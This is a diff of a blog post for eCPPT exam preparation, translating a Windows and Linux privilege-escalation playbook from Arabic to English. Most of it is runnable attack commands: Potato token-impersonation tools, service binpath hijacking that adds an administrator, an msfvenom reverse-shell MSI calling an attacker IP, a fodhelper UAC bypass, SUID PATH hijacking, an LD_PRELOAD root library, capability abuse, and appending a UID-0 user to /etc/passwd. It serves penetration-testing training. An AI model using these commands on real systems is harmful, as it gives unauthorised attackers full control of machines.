@@ -3,7 +3,7 @@ title: "eCPPT Deep-Dive: Part 5 - Windows & Linux Privilege Escalation Playbook"
 date: 2026-11-12 12:00:00 +0300
 categories: [Cyber Security, Penetration Testing]
 tags: [ecppt, privilege-escalation, windows-privesc, linux-privesc, uac-bypass, token-impersonation, suid, gtfobins]
-description: "الدليل الشامل للجزء الخامس من مسار eCPPT: الدليل الميداني لتصعيد الصلاحيات على أنظمة Windows و Linux، انتحال رموز الأمان (Potato Attacks)، استغلال خدمات النظام، وتجاوز UAC وثغرات SUID و Sudo."
+description: "An exhaustive technical breakdown of Part 5 of the eCPPT curriculum: the definitive field playbook for local privilege escalation on Windows and Linux, token impersonation (Potato attacks), insecure service abuse, silent UAC bypasses, SUID exploitation, and sudo environment hijacking."
 image:
   path: /assets/images/posts/ecppt/part-5-cover.png
   alt: "eCPPT Masterclass Part 5 - Windows & Linux Privilege Escalation Playbook"
@@ -14,35 +14,35 @@ schema:
   author: Abdulrahman M. Fathi
 ---
 
-يعد تصعيد الصلاحيات (**Privilege Escalation**) المرحلة الفاصلة بعد الحصول على موطئ قدم أولي كمستخدم محدود الصلاحيات (Standard User أو مساحة تطبيق ويب مثل `www-data`). فبدون رفع الصلاحيات إلى أعلى مستوى في نظام التشغيل (`NT AUTHORITY\SYSTEM` في ويندوز أو `root` في لينكس)، لا يمكن لمختبر الاختراق استخراج كلمات المرور المشفرة من الذاكرة، أو تثبيت الاستمرارية، أو استكمال التوجيه الشبكي (Pivoting).
+Securing an initial foothold—whether through web application command injection, a client-side phishing macro, or exploiting an unauthenticated daemon—typically lands an operator in a strictly unprivileged context (e.g., `www-data`, `local service`, or a low-rights standard user). In the **eCPPT (eLearnSecurity Certified Professional Penetration Tester)** examination, achieving local root (`NT AUTHORITY\SYSTEM` on Windows or `root` on Linux) is mandatory to extract password hashes from memory, establish reliable network pivots, and complete post-exploitation objectives.
 
-في هذا الدليل العملي المعمق، سنستعرض الترسانة الكاملة لتصعيد الصلاحيات محليًا على أنظمة Windows و Linux بأسلوب تطبيقي مباشر يغطي كافة متطلبات مختبرات واختبار **eCPPT**.
+In this deep dive, we present an exhaustive field engineering playbook for **Windows and Linux Local Privilege Escalation**, detailing automated auditing workflows, core operating system security primitives, and reliable manual exploit techniques.
 
 ---
 
-### جدول التنقل في السلسلة (Series Navigation)
+### Series Navigation
 
-| **المقال السابق** | **المقال الحالي** | **المقال القادم** |
+| **Previous Part** | **Current Part** | **Next Part** |
 | :---: | :---: | :---: |
-| [الجزء 4: اختبار اختراق الدليل النشط (Active Directory)](/posts/ecppt-v3-part-4-active-directory-penetration-testing/) | **الجزء 5: تصعيد الصلاحيات على Windows و Linux** | [الجزء 6: الحركة الجانبية والقفز الشبكي (Pivoting)](/posts/ecppt-v3-part-6-lateral-movement-and-pivoting/) |
+| [Part 4: Active Directory Pentesting & Kerberos](/posts/ecppt-v3-part-4-active-directory-penetration-testing/) | **Part 5: Windows & Linux Privilege Escalation** | [Part 6: Lateral Movement & Pivoting](/posts/ecppt-v3-part-6-lateral-movement-and-pivoting/) |
 
 ---
 
-## أبرز النقاط الرئيسية (Key Takeaways)
+## Key Takeaways
 
-* **انتحال رموز الأمان في ويندوز (Token Impersonation)**: امتلاك صلاحية `SeImpersonatePrivilege` أو `SeAssignPrimaryTokenPrivilege` (المتاحة افتراضيًا لحسابات الخدمات مثل `LOCAL SERVICE` و `NETWORK SERVICE`) يسمح بتنفيذ هجمات "البطاطس" (Potato Family مثل PrintSpoofer و GodPotato) وخداع النظام لإنشاء جلسة `SYSTEM`.
-* **سوء تهيئة الخدمات (Insecure Services)**: البحث عن مسارات الخدمات غير المحاطة باقتباسات (Unquoted Service Paths)، أو الخدمات ذات الصلاحيات الضعيفة في قائمة التحكم بالوصول (Weak DACLs) لتعديل مسار الملف التنفيذي (`binpath`).
-* **تجاوز UAC بصمت**: تجاوز آليات التحكم في حساب المستخدم عبر استغلال الملفات التنفيذية التي ترقي نفسها تلقائيًا (Auto-Elevate) وتقرأ مفاتيح سجل النظام (Registry) غير المحمية مثل `fodhelper.exe` و `sdclt.exe`.
-* **ملفات SUID والتحايل على مسار PATH في لينكس**: استغلال الملفات الثنائية التي تعمل بصلاحيات المالك عبر قاعدة بيانات **GTFOBins**، واستغلال استدعاءات الأوامر النسبية لحقن مسارات خبيثة قبل المسارات النظامية.
-* **ثغرات بيئة Sudo والقدرات (Capabilities)**: التدقيق في مخرجات `sudo -l` والبحث عن متغيرات البيئة الخطرة مثل `LD_PRELOAD`، واستغلال القدرات الممنوحة للملفات مثل `cap_setuid+ep`.
+* **Windows Token Impersonation (`SeImpersonatePrivilege`)**: Service accounts such as `LOCAL SERVICE` or `NETWORK SERVICE` frequently hold token impersonation rights. By coercing high-privilege system services (such as Print Spooler or RPC) to authenticate against a rogue local Named Pipe, attackers trigger token impersonation (via the "Potato" exploit family) to instantly elevate to `NT AUTHORITY\SYSTEM`.
+* **Insecure Service Configuration**: Windows services must be audited for weak Discretionary Access Control Lists (DACLs allowing binary path modifications), unquoted service paths containing spaces, and weak filesystem permissions on service executables.
+* **Bypassing UAC Silently**: Standard users belonging to the local `Administrators` group operate under filtered medium-integrity tokens. We execute silent UAC bypasses by hijacking registry keys referenced by auto-elevating binaries (`fodhelper.exe`, `sdclt.exe`).
+* **Linux SUID Binaries & PATH Hijacking**: Executables assigned the SUID bit run with the permissions of their owner. We audit custom SUID binaries for relative command invocations (allowing `PATH` hijacking) and cross-reference standard utilities against the **GTFOBins** database.
+* **Sudo Environment Abuse (`LD_PRELOAD`)**: When `sudo -l` reveals commands configured with `NOPASSWD`, or when the `env_keep+=LD_PRELOAD` directive is preserved, attackers can inject arbitrary shared libraries (`.so`) into root execution space.
 
 ---
 
-## أولاً: تصعيد الصلاحيات على أنظمة Windows
+## Section 1: Windows Privilege Escalation Playbook
 
-### 1. انتحال رموز الأمان وهجمات Potato (Token Impersonation)
+### 1. Token Impersonation and the "Potato" Exploit Family
 
-في نظام ويندوز، عندما تبدأ خدمة بالعمل، يُنشأ لها رمز دخول (Access Token) يحدد هويتها وصلاحياتها. إذا كان المستخدم يملك صلاحية `SeImpersonatePrivilege`:
+In Windows, processes access resources using **Access Tokens**. When an operator executes `whoami /priv` and discovers:
 
 ```cmd
 whoami /priv
@@ -51,71 +51,71 @@ whoami /priv
 # SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 ```
 
-يمكن للمهاجم إجبار عملية تعمل بصلاحيات `NT AUTHORITY\SYSTEM` (مثل خدمة الطباعة Spooler أو DCOM) على المصادقة عبر أنبوب مسمى (Named Pipe) يتحكم به المهاجم، ثم انتحال رمز أمان النظام للحصول على Shell كامل:
+The operator can force an elevated Windows component running under `NT AUTHORITY\SYSTEM` to connect to a controlled local communication endpoint (such as a Named Pipe or RPC endpoint). The attacker process then calls `ImpersonateNamedPipeClient()` or `DuplicateTokenEx()` to duplicate the system token and spawn an administrative process:
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor Attacker as نص المهاجم (PrintSpoofer / GodPotato)
-    participant Pipe as أنبوب مسمى وهمي (Named Pipe)
-    participant Spooler as خدمة نظام ويندوز (Spoolsv / RPC SYSTEM)
-    participant Kernel as نواة ويندوز (Windows Kernel)
+    actor Attacker as Exploit Process (PrintSpoofer / GodPotato)
+    participant Pipe as Rogue Named Pipe (\\.\pipe\spoolss)
+    participant Spooler as Windows System Service (spoolsv.exe - SYSTEM)
+    participant Kernel as Windows Kernel Token Dispatcher
     
-    Attacker->>Pipe: إنشاء أنبوب مسمى وتهيئته للاستماع
-    Attacker->>Spooler: إثارة استدعاء RPC إلى الأنبوب المسمى
-    Spooler->>Pipe: اتصال خدمة النظام بالأنبوب ومحاولة المصادقة
-    Pipe->>Kernel: استدعاء ImpersonateNamedPipeClient()
-    Kernel->>Attacker: توليد رمز دخول (Token) بصلاحيات NT AUTHORITY\SYSTEM!
-    Attacker->>Kernel: إنشاء عملية تفاعلية جديدة (cmd.exe) باستخدام الرمز المسروق
+    Attacker->>Pipe: Creates and initializes a listening local Named Pipe
+    Attacker->>Spooler: Triggers RPC call via Print Spooler API
+    Spooler->>Pipe: System service connects and authenticates to the Named Pipe
+    Pipe->>Kernel: Calls ImpersonateNamedPipeClient() API
+    Kernel->>Attacker: Generates duplicated Access Token with NT AUTHORITY\SYSTEM rights!
+    Attacker->>Kernel: Spawns new interactive process (cmd.exe) using SYSTEM Token
 ```
 
-#### أوامر الاستغلال العملية:
+#### Field Exploitation Commands:
 
 ```cmd
-# 1. على أنظمة Windows 10 و Server 2016/2019 عبر PrintSpoofer
+# Modern Windows 10 / Server 2016 / Server 2019 via PrintSpoofer
 PrintSpoofer.exe -i -c cmd.exe
 
-# 2. على أنظمة Windows Server 2012/2008 القديمة عبر JuicyPotato
-JuicyPotato.exe -l 1337 -p c:\temp\rev.exe -t * -c {CLSID-Value}
+# Legacy Windows Server 2008 / 2012 via JuicyPotato (requires finding valid CLSID)
+JuicyPotato.exe -l 1337 -p c:\temp\shell.exe -t * -c {CLSID-Value}
 
-# 3. الاستغلال العالمي الحديث عبر GodPotato (يدعم حتى Windows 11 و Server 2022)
+# Universal modern exploit via GodPotato (Supports Windows 10, 11, Server 2022)
 GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
 ```
 
 ---
 
-### 2. استغلال الخدمات الضعيفة (Insecure Services)
+### 2. Insecure Windows Service Configurations
 
-#### أ. مسارات الخدمات غير المحاطة باقتباسات (Unquoted Service Paths)
-إذا كان مسار خدمة يحتوي على مسافات وغير محاط بعلامات تنصيص `"..."`، فإن نظام ويندوز سيحاول البحث عن ملفات تنفيذية في كل مسافة في المسار:
+#### A. Unquoted Service Paths:
+When a Windows service path contains spaces and lacks enclosing quotes, Windows attempts to execute files matching each space boundary in sequence:
 
 ```text
-مسار الخدمة: C:\Program Files\My Service\daemon.exe
-ويندوز يحاول تنفيذ:
+Service Path: C:\Program Files\Development Tools\service.exe
+Windows checks in order:
 1. C:\Program.exe
-2. C:\Program Files\My.exe
-3. C:\Program Files\My Service\daemon.exe
+2. C:\Program Files\Development.exe
+3. C:\Program Files\Development Tools\service.exe
 ```
 
-إذا كانت لدينا صلاحية كتابة في `C:\Program Files`، نضع ملفنا الخبيث باسم `My.exe` ونعيد تشغيل الخدمة:
+If write permissions exist on `C:\Program Files`, placing an attacker payload named `Development.exe` guarantees administrative code execution upon service restart:
 
 ```cmd
-# كشف المسارات المصابة عبر WMI
+# Enumerate unquoted service paths via WMI
 wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
 
-# وضع الحمولة وإعادة تشغيل الخدمة
-copy rev_shell.exe "C:\Program Files\My.exe"
-net stop VulnerableService && net start VulnerableService
+# Place the binary and restart the service
+copy shell.exe "C:\Program Files\Development.exe"
+net stop "Vulnerable Service" && net start "Vulnerable Service"
 ```
 
-#### ب. تعديل مسار الخدمة المباشر (Weak Service DACL)
-إذا كان المستخدم يمتلك صلاحية `SERVICE_CHANGE_CONFIG` على الخدمة:
+#### B. Modifiable Service Binaries and Weak DACLs:
+If an unprivileged user has `SERVICE_CHANGE_CONFIG` or write permissions over the service definition, modify the binary path directly:
 
 ```cmd
-# فحص الصلاحيات عبر أداة AccessChk من Sysinternals
+# Audit service permissions using AccessChk
 accesschk.exe /accepteula -ucwv users VulnerableService
 
-# تغيير مسار الملف التنفيذي للخدمة وحقن أمر إضافة مدير محلي
+# Overwrite service binary path to execute arbitrary commands
 sc config VulnerableService binpath= "net localgroup administrators attacker /add"
 sc stop VulnerableService
 sc start VulnerableService
@@ -123,93 +123,95 @@ sc start VulnerableService
 
 ---
 
-### 3. ثغرة التثبيت المرتفع (AlwaysInstallElevated)
+### 3. Registry AlwaysInstallElevated Abuse
 
-إذا تم تفعيل هذه الخاصية في سجل النظام (Registry)، فإن خدمة تثبيت ويندوز (`msiexec.exe`) ستثبت أي حزمة MSI بصلاحيات `NT AUTHORITY\SYSTEM`:
+If system administrators enable elevated MSI package installation via Group Policy, any low-privileged user can run an installer that executes arbitrary commands with `NT AUTHORITY\SYSTEM` rights:
 
 ```cmd
-# التحقق من وجود المفاتيح في السجل
+# Verify registry keys in both HKLM and HKCU
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-# إذا كانت القيمة 0x1 في كلا المسارين فالهدف مصاب تمامًا!
+# Both keys must return 0x1
 
-# توليد حزمة MSI خبيثة عبر msfvenom
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f msi -o update.msi
+# Generate a malicious installer MSI payload using msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
 
-# تشغيل التثبيت بصمت ورفع الصلاحيات
-msiexec /quiet /qn /i update.msi
+# Execute silently to achieve elevated shell access
+msiexec /quiet /qn /i install.msi
 ```
 
 ---
 
-### 4. تجاوز حماية التحكم بحساب المستخدم (UAC Bypass)
+### 4. Silent User Account Control (UAC) Bypasses
 
-تعتمد هذه التقنية على استغلال برامج نظام ويندوز الرسمية الموثقة برقم موقع من مايكروسوفت وتحتوي على خاصية الرفع التلقائي في الـ Manifest (`autoElevate = true`).
+When operating as a user who belongs to the local `Administrators` group but is executing within a medium-integrity context, User Account Control (UAC) prompts will block privileged commands. We leverage native Microsoft binaries that have `autoElevate = true` embedded in their manifests:
 
 ```cmd
-# استغلال أداة fodhelper.exe عبر التلاعب بمفتاح سجل الامتداد ms-settings
+# Hijack the registry key queried by fodhelper.exe
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c start C:\temp\shell.exe" /f
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
 
-# تشغيل الأداة (ستقوم بتنفيذ الأمر المحقون في السجل بصلاحيات المدير دون إظهار نافذة UAC!)
+# Trigger the auto-elevating binary without any GUI prompt
 C:\Windows\System32\fodhelper.exe
 ```
 
 ---
 
-## ثانيًا: تصعيد الصلاحيات على أنظمة Linux
+## Section 2: Linux Privilege Escalation Playbook
 
 ```mermaid
 flowchart TD
-    Start["موطئ قدم أولي على Linux (www-data / user)"] --> Enum["تشغيل سكربت الفحص الشامل LinPEAS"]
+    Start["Initial Linux Foothold (www-data or low-privilege user)"] --> Audit["Execute Automated Enumeration (LinPEAS / LinEnum)"]
     
-    Enum --> SudoCheck{"فحص مخرجات sudo -l"}
-    SudoCheck -- يوجد أوامر NOPASSWD --> SudoExploit["مراجعة GTFOBins للأمر وتنفيذه بروت"]
-    SudoCheck -- مفعل LD_PRELOAD --> Preload["حقن مكتبة C خبيثة عبر LD_PRELOAD"]
+    Audit --> SudoCheck{"Check Sudo Rules (sudo -l)"}
+    SudoCheck -- NOPASSWD Commands Found --> GTFO["Reference GTFOBins and execute bypass"]
+    SudoCheck -- env_keep+=LD_PRELOAD --> Preload["Compile malicious .so and inject via LD_PRELOAD"]
     
-    Enum --> SUIDCheck{"البحث عن ملفات SUID غريبة"}
-    SUIDCheck -- مطابقة في GTFOBins --> SUIDExploit["استغلال الثنائي لفتح Bash بصلاحية Root"]
-    SUIDCheck -- ثنائي مخصص يستدعي أمر نسبي --> PATHHijack["تعديل متغير المسار PATH لحقن أمر وهمي"]
+    Audit --> SUIDCheck{"Audit SUID Binaries (find / -perm -u=s)"}
+    SUIDCheck -- Standard Binary --> SUIDGTFO["Exploit binary via GTFOBins"]
+    SUIDCheck -- Custom Binary with Relative Call --> PATHHijack["Prepend /tmp to PATH to execute custom script"]
     
-    Enum --> CapCheck{"فحص القدرات getcap -r /"}
-    CapCheck -- توجد قدرة cap_setuid+ep --> CapExploit["استدعاء setuid(0) عبر Python أو Perl"]
+    Audit --> CapCheck{"Check Linux Capabilities (getcap -r /)"}
+    CapCheck -- cap_setuid+ep Found --> CapExploit["Invoke setuid(0) via Python or Perl"]
+    
+    Audit --> PasswdCheck{"Is /etc/passwd Writable?"}
+    PasswdCheck -- Yes --> PasswdExploit["Append custom UID 0 root user with openssl hash"]
 ```
 
 ---
 
-### 1. استغلال ملفات SUID و التحايل على متغير المسار (PATH Hijacking)
+### 1. SUID Binaries and PATH Variable Hijacking
 
-ملفات SUID تعمل دائمًا بصلاحيات مالك الملف (الذي غالبًا ما يكون `root`).
+Files configured with the **SUID (Set User ID)** permission run under the authority of the file's owner (typically `root`).
 
 ```bash
-# البحث عن كافة ملفات SUID في النظام
+# Locate all SUID executables across the filesystem
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-#### سيناريو استدعاء الأوامر النسبية والتحايل على المسار (PATH Hijacking):
-إذا وجدنا ملفًا تنفيذيًا خاصًا (Custom Binary) يحتوي على استدعاء لأمر بدون مسار مطلق (مثل استدعاء `service apache2 restart` بدلاً من `/usr/sbin/service`):
+#### Exploiting Relative Binary Paths (PATH Hijacking):
+If analysis of a custom SUID executable reveals calls to external system utilities without full absolute paths (e.g., invoking `service status` instead of `/usr/sbin/service`):
 
 ```bash
-# فحص الكلمات النصية داخل الملف الثنائي
-strings /opt/maintenance/backup_tool
+# Inspect ASCII strings inside the SUID binary
+strings /opt/custom/status_checker
 
-# إنشاء ملف مزيف يحمل اسم service داخل /tmp
+# Create a malicious script named 'service' in /tmp
 echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
 chmod +x /tmp/service
 
-# وضع /tmp في بداية متغير المسار PATH
+# Prepend /tmp to the beginning of the PATH environment variable
 export PATH=/tmp:$PATH
 
-# تشغيل الثنائي ذو صلاحية SUID
-/opt/maintenance/backup_tool
-# النتيجة: سيستدعي النظام سكريبت /tmp/service ويفتح Shell بروت فوري!
+# Run the SUID binary; it will execute /tmp/service as root!
+/opt/custom/status_checker
 ```
 
 ---
 
-### 2. استغلال بيئة Sudo والمتغير LD_PRELOAD
+### 2. Sudo Misconfigurations and LD_PRELOAD Exploitation
 
-عند تشغيل الأمر `sudo -l`، نقرأ الصلاحيات الممنوحة للمستخدم:
+Auditing `sudo -l` reveals permissions granted to the current user:
 
 ```text
 Matching Defaults entries for student on target:
@@ -219,17 +221,17 @@ User student may run the following commands on target:
     (ALL : ALL) NOPASSWD: /usr/bin/find
 ```
 
-#### الحالة 1: استغلال الأوامر المصرحة عبر GTFOBins
+#### Attack Path A: GTFOBins Command Injection
 ```bash
-# استغلال أمر find لفتح جلسة تفاعلية
+# Exploit find to launch an interactive root shell
 sudo find . -exec /bin/sh \; -quit
 ```
 
-#### الحالة 2: استغلال احتفاظ بيئة Sudo بـ `LD_PRELOAD`
-إذا كان خيار `env_keep+=LD_PRELOAD` مفعلًا، يمكننا إجبار أي أمر مدعوم بـ Sudo على تحميل مكتبة ديناميكية مشتركة (`.so`) نقوم بكتابتها لحقن شيفرة تعطينا الجذر فورًا:
+#### Attack Path B: Exploiting `LD_PRELOAD`
+If `env_keep+=LD_PRELOAD` is active, we compile a shared library that hooks the process initialization routine (`_init`):
 
 ```c
-// كود المكتبة الخبيثة evil.c
+// evil.c
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -243,55 +245,55 @@ void _init() {
 ```
 
 ```bash
-# ترجمة الكود إلى مكتبة مشتركة
+# Compile into a shared object (.so)
 gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles
 
-# تشغيل أي أمر مسموح به في sudo مع تحميل المكتبة
+# Execute any allowed sudo command with LD_PRELOAD
 sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find
-# المخرج الفوري: root@target:~#
+# Immediate result: root@target:~#
 ```
 
 ---
 
-### 3. ثغرات القدرات الأمنية (Linux Capabilities)
+### 3. Exploiting Linux Capabilities
 
-تُقسم قدرات لينكس صلاحيات `root` المطلقة إلى امتيازات دقيقة ومستقلة:
+Linux divides traditional root privileges into distinct privileges known as **Capabilities**:
 
 ```bash
-# استكشاف القدرات الممنوحة للملفات الثنائية
+# Recursively audit all binaries assigned elevated capabilities
 getcap -r / 2>/dev/null
 
-# إذا وجدنا مثلاً: /usr/bin/python3 = cap_setuid+ep
+# If /usr/bin/python3 has cap_setuid+ep configured:
 /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
 ---
 
-### 4. التعديل على ملفات الحسابات الحساسة (/etc/passwd)
+### 4. Writable `/etc/passwd` File
 
-إذا كان ملف `/etc/passwd` يملك صلاحيات كتابة للمستخدمين العاديين (سواء بسبب خطأ في الإعدادات `chmod 777`):
+If misconfigured permissions grant write access to `/etc/passwd`:
 
 ```bash
-# توليد هاش كلمة مرور جديدة بمعيار SHA-512
-openssl passwd -1 -salt evil Password123
-# الناتج: $1$evil$T7c96Bq0hR84g...
+# Generate a salt and password hash using OpenSSL
+openssl passwd -1 -salt rootpw Password123
+# Generated Hash: $1$rootpw$4ZkK9M9v7R8...
 
-# إضافة حساب مستخدم جديد بصلاحيات root (UID 0 و GID 0)
-echo 'hacker:$1$evil$T7c96Bq0hR84g...:0:0:root:/root:/bin/bash' >> /etc/passwd
+# Append a custom user with UID 0 and GID 0 (root equivalent)
+echo 'hacker:$1$rootpw$4ZkK9M9v7R8...:0:0:root:/root:/bin/bash' >> /etc/passwd
 
-# التبديل الفوري للمستخدم الجديد
+# Authenticate as the newly created root user
 su hacker
-# إدخال كلمة المرور: Password123 -> الحصول على صلاحية Root!
+# Enter Password123 -> Full root access obtained!
 ```
 
 ---
 
-## المراجع والمصادر الخارجية (References & Further Reading)
+## References & Further Reading
 
-1. **GTFOBins Project**: الدليل المرجعي العالمي لتجاوز حمايات وصلاحيات ملفات لينكس الثنائية: [https://gtfobins.github.io/](https://gtfobins.github.io/)
-2. **LOLBAS Project (Living Off The Land Binaries and Scripts)** لبيئات ويندوز: [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
-3. **PayloadsAllTheThings - Privilege Escalation Guides**: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-4. **HackTricks - Windows & Linux Local Privilege Escalation**: موسوعة كارلوس بولوب الميدانية.
+1. **GTFOBins Unix Binaries Privilege Escalation Reference**: [https://gtfobins.github.io/](https://gtfobins.github.io/)
+2. **LOLBAS Project (Living Off The Land Binaries and Scripts for Windows)**: [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
+3. **PayloadsAllTheThings - Privilege Escalation**: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+4. **HackTricks - Windows & Linux Local Privilege Escalation**: by Carlos Polop.
 5. **MITRE ATT&CK Matrix**:
    * Technique T1548: Abuse Elevation Control Mechanism (Bypass UAC, SUID/SGID)
    * Technique T1134: Access Token Manipulation
